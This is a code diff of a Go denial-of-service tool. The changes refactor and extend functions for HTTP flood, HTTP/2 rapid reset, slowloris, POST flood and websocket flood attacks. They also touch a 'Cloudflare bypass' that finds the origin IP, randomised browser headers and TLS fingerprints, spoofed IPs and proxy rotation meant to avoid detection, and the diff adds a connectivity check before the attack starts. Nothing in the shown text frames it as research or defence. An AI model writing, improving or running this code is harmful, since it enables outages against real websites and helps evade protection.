@@ -40,7 +40,7 @@ const (
 	SOCKET_BUF_SIZE      = 16 * 1024 * 1024
 )
 
-// ==================== CONFIGURATION STRUCT ====================
+// ==================== CONFIGURATION ====================
 type Config struct {
 	threadCount   int
 	durationSec   int
@@ -55,11 +55,11 @@ type Config struct {
 	slowloris     bool
 	websocket     bool
 	originIP      string
+	originalURL   string
 }
 
 var cfg Config
 
-// ==================== GLOBAL STATE ====================
 var (
 	totalRequests uint64
 	totalBytes    uint64
@@ -67,73 +67,70 @@ var (
 	stopTime      time.Time
 )
 
-var (
-	userAgents = []string{
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
-		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
-		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
-		"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
-		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-	}
+// ==================== USER AGENTS & HEADERS ====================
+var userAgents = []string{
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+}
 
-	referers = []string{
-		"https://www.google.com/",
-		"https://www.bing.com/",
-		"https://www.yahoo.com/",
-		"https://www.facebook.com/",
-		"https://twitter.com/",
-		"https://www.instagram.com/",
-		"https://www.youtube.com/",
-		"https://www.reddit.com/",
-		"https://github.com/",
-		"https://stackoverflow.com/",
-	}
+var referers = []string{
+	"https://www.google.com/",
+	"https://www.bing.com/",
+	"https://www.yahoo.com/",
+	"https://www.facebook.com/",
+	"https://twitter.com/",
+	"https://www.instagram.com/",
+	"https://www.youtube.com/",
+	"https://www.reddit.com/",
+	"https://github.com/",
+	"https://stackoverflow.com/",
+}
 
-	acceptHeaders = []string{
-		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/svg+xml,*/*;q=0.8",
-	}
+var acceptHeaders = []string{
+	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/svg+xml,*/*;q=0.8",
+}
 
-	acceptLanguages = []string{
-		"en-US,en;q=0.9",
-		"en-GB,en;q=0.9",
-		"id-ID,id;q=0.9,en;q=0.8",
-		"zh-CN,zh;q=0.9,en;q=0.8",
-		"ja-JP,ja;q=0.9,en;q=0.8",
-	}
+var acceptLanguages = []string{
+	"en-US,en;q=0.9",
+	"en-GB,en;q=0.9",
+	"id-ID,id;q=0.9,en;q=0.8",
+	"zh-CN,zh;q=0.9,en;q=0.8",
+	"ja-JP,ja;q=0.9,en;q=0.8",
+}
 
-	acceptEncodings = []string{
-		"gzip, deflate, br",
-		"gzip, deflate",
-		"gzip, br",
-		"deflate, br",
-	}
+var acceptEncodings = []string{
+	"gzip, deflate, br",
+	"gzip, deflate",
+	"gzip, br",
+	"deflate, br",
+}
 
-	secChUa = []string{
-		`"Chromium";v="120", "Google Chrome";v="120", "Not?A_Brand";v="99"`,
-		`"Chromium";v="119", "Google Chrome";v="119", "Not?A_Brand";v="99"`,
-		`"Firefox";v="121", "Gecko";v="121"`,
-		`"Microsoft Edge";v="119", "Chromium";v="119"`,
-	}
-)
+var secChUa = []string{
+	`"Chromium";v="120", "Google Chrome";v="120", "Not?A_Brand";v="99"`,
+	`"Chromium";v="119", "Google Chrome";v="119", "Not?A_Brand";v="99"`,
+	`"Firefox";v="121", "Gecko";v="121"`,
+	`"Microsoft Edge";v="119", "Chromium";v="119"`,
+}
 
-// ==================== PROXY MANAGEMENT ====================
-
+// ==================== PROXY ====================
 func loadProxies(filename string) error {
 	file, err := os.Open(filename)
 	if err != nil {
 		return err
 	}
 	defer file.Close()
-
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		line := strings.TrimSpace(scanner.Text())
@@ -198,9 +195,7 @@ func getRandomCipherSuites() []uint16 {
 		tls.TLS_AES_256_GCM_SHA384,
 		tls.TLS_CHACHA20_POLY1305_SHA256,
 	}
-	rand.Shuffle(len(ciphers), func(i, j int) {
-		ciphers[i], ciphers[j] = ciphers[j], ciphers[i]
-	})
+	rand.Shuffle(len(ciphers), func(i, j int) { ciphers[i], ciphers[j] = ciphers[j], ciphers[i] })
 	count := 3 + rand.Intn(3)
 	if count > len(ciphers) {
 		count = len(ciphers)
@@ -209,7 +204,6 @@ func getRandomCipherSuites() []uint16 {
 }
 
 // ==================== CLOUDFLARE BYPASS ====================
-
 func discoverOriginIP(targetURL string) string {
 	parsed, err := url.Parse(targetURL)
 	if err != nil {
@@ -249,13 +243,11 @@ func isCloudflareIP(ip net.IP) bool {
 }
 
 // ==================== REQUEST BUILDER ====================
-
 func buildRequest(targetURL string, method string) (*http.Request, error) {
 	req, err := http.NewRequest(method, targetURL, nil)
 	if err != nil {
 		return nil, err
 	}
-
 	ua := userAgents[rand.Intn(len(userAgents))]
 	req.Header.Set("User-Agent", ua)
 	req.Header.Set("Referer", referers[rand.Intn(len(referers))])
@@ -266,7 +258,6 @@ func buildRequest(targetURL string, method string) (*http.Request, error) {
 	req.Header.Set("Cache-Control", cacheControls[rand.Intn(len(cacheControls))])
 	connections := []string{"keep-alive", "close", "upgrade"}
 	req.Header.Set("Connection", connections[rand.Intn(len(connections))])
-
 	if rand.Intn(2) == 0 {
 		secUa := secChUa[rand.Intn(len(secChUa))]
 		req.Header.Set("Sec-Ch-Ua", secUa)
@@ -294,19 +285,14 @@ func buildRequest(targetURL string, method string) (*http.Request, error) {
 		req.Header.Set("Cookie", cookie)
 	}
 	if cfg.originIP != "" {
-		req.Host = parsedHost(targetURL)
+		u, _ := url.Parse(cfg.originalURL)
+		req.Host = u.Host
 	}
 	return req, nil
 }
 
-func parsedHost(targetURL string) string {
-	u, _ := url.Parse(targetURL)
-	return u.Host
-}
-
 func generateRandomIP() string {
-	return fmt.Sprintf("%d.%d.%d.%d",
-		rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
+	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
 }
 
 func generateRandomString(n int) string {
@@ -318,14 +304,43 @@ func generateRandomString(n int) string {
 	return string(b)
 }
 
-// ==================== ATTACK METHODS ====================
+// ==================== ATTACK FUNCTIONS ====================
+func httpFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
+	defer wg.Done()
+	client := &http.Client{
+		Transport: createTransportWithProxy(),
+		Timeout:   30 * time.Second,
+	}
+	for time.Now().Before(stopTime) {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+		}
+		req, err := buildRequest(targetURL, "GET")
+		if err != nil {
+			atomic.AddUint64(&totalRequests, 1)
+			continue
+		}
+		resp, err := client.Do(req)
+		if err != nil {
+			// Print error once per worker to stderr (visible in SSH output)
+			if atomic.AddUint64(&totalRequests, 1) == 1 {
+				fmt.Fprintf(os.Stderr, "[!] Worker %d: %v\n", workerID, err)
+			}
+			continue
+		}
+		body, _ := io.ReadAll(resp.Body)
+		atomic.AddUint64(&totalBytes, uint64(len(body)))
+		resp.Body.Close()
+		atomic.AddUint64(&totalRequests, 1)
+		time.Sleep(time.Millisecond * time.Duration(rand.Intn(5)))
+	}
+}
 
 func rapidResetAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
 	defer wg.Done()
-	parsedURL, err := url.Parse(targetURL)
-	if err != nil {
-		return
-	}
+	parsedURL, _ := url.Parse(targetURL)
 	host := parsedURL.Host
 	if !strings.Contains(host, ":") {
 		if parsedURL.Scheme == "https" {
@@ -349,8 +364,9 @@ func rapidResetAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup,
 			return
 		default:
 		}
-		req, err := buildRequest(targetURL, "GET")
-		if err != nil {
+		req, _ := buildRequest(targetURL, "GET")
+		if req == nil {
+			atomic.AddUint64(&totalRequests, 1)
 			continue
 		}
 		resp, err := client.Do(req)
@@ -367,10 +383,7 @@ func rapidResetAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup,
 
 func slowlorisAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
 	defer wg.Done()
-	parsedURL, err := url.Parse(targetURL)
-	if err != nil {
-		return
-	}
+	parsedURL, _ := url.Parse(targetURL)
 	host := parsedURL.Host
 	port := "80"
 	if parsedURL.Scheme == "https" {
@@ -386,6 +399,7 @@ func slowlorisAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, 
 		default:
 		}
 		var conn net.Conn
+		var err error
 		if cfg.useProxy {
 			proxyURL := getNextProxy()
 			if proxyURL != "" {
@@ -398,6 +412,7 @@ func slowlorisAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, 
 			conn, err = net.DialTimeout("tcp", net.JoinHostPort(host, port), 10*time.Second)
 		}
 		if err != nil {
+			atomic.AddUint64(&totalRequests, 1)
 			continue
 		}
 		request := fmt.Sprintf("GET /%s HTTP/1.1\r\n", generateRandomString(rand.Intn(32)+1))
@@ -440,43 +455,6 @@ func slowlorisAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, 
 	}
 }
 
-func httpFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
-	defer wg.Done()
-	client := &http.Client{
-		Transport: createTransportWithProxy(),
-		Timeout:   30 * time.Second,
-	}
-	for time.Now().Before(stopTime) {
-		select {
-		case <-ctx.Done():
-			return
-		default:
-		}
-		req, err := buildRequest(targetURL, "GET")
-		if err != nil {
-			continue
-		}
-		var start time.Time
-		trace := &httptrace.ClientTrace{
-			GotFirstResponseByte: func() {
-				_ = time.Since(start)
-			},
-		}
-		req = req.WithContext(httptrace.WithClientTrace(ctx, trace))
-		start = time.Now()
-		resp, err := client.Do(req)
-		if err != nil {
-			atomic.AddUint64(&totalRequests, 1)
-			continue
-		}
-		body, _ := io.ReadAll(resp.Body)
-		atomic.AddUint64(&totalBytes, uint64(len(body)))
-		resp.Body.Close()
-		atomic.AddUint64(&totalRequests, 1)
-		time.Sleep(time.Millisecond * time.Duration(rand.Intn(5)))
-	}
-}
-
 func postFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
 	defer wg.Done()
 	client := &http.Client{
@@ -492,6 +470,7 @@ func postFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, 
 		postData := generateRandomPostData()
 		req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer(postData))
 		if err != nil {
+			atomic.AddUint64(&totalRequests, 1)
 			continue
 		}
 		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
@@ -575,8 +554,7 @@ func websocketFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGr
 	}
 }
 
-// ==================== CONFIGURATION ====================
-
+// ==================== INIT ====================
 func initConfig() error {
 	var err error
 	cfg.durationSec, err = strconv.Atoi(duration)
@@ -599,6 +577,8 @@ func initConfig() error {
 		fmt.Printf("[!] No proxy file found, continuing without proxies\n")
 		cfg.useProxy = false
 	}
+	// Simpan original URL
+	cfg.originalURL = targetURL
 	originIP := discoverOriginIP(targetURL)
 	if originIP != "" {
 		fmt.Printf("[+] Discovered potential origin IP: %s\n", originIP)
@@ -614,12 +594,24 @@ func initConfig() error {
 			targetURL = parsed.Scheme + "://" + hostPort
 			fmt.Printf("[+] Updated target to origin IP: %s\n", targetURL)
 		}
+	} else {
+		fmt.Printf("[!] Could not discover origin IP, using original domain\n")
+	}
+	// Test connectivity before starting
+	fmt.Printf("[*] Testing connectivity to %s ...\n", targetURL)
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Get(targetURL)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[!] WARNING: Initial connection test failed: %v\n", err)
+		fmt.Fprintf(os.Stderr, "[!] Attack may still work, but errors are expected.\n")
+	} else {
+		resp.Body.Close()
+		fmt.Printf("[+] Connectivity OK (HTTP %d)\n", resp.StatusCode)
 	}
 	switch cfg.attackMethod {
 	case "HTTP_FLOOD":
 		cfg.randomAgent = true
 		cfg.randomHeaders = true
-		cfg.useHTTP2 = false
 	case "HTTP2_RAPID":
 		cfg.useHTTP2 = true
 		cfg.rapidReset = true
@@ -635,13 +627,12 @@ func initConfig() error {
 		cfg.slowloris = true
 		cfg.websocket = true
 	}
-	stopTime = time.Now().Add(time.Duration(cfg.durationSec) * time.Second)
 	startTime = time.Now()
+	stopTime = startTime.Add(time.Duration(cfg.durationSec) * time.Second)
 	return nil
 }
 
 // ==================== MAIN ====================
-
 func main() {
 	if err := initConfig(); err != nil {
 		fmt.Fprintf(os.Stderr, "Init error: %v\n", err)
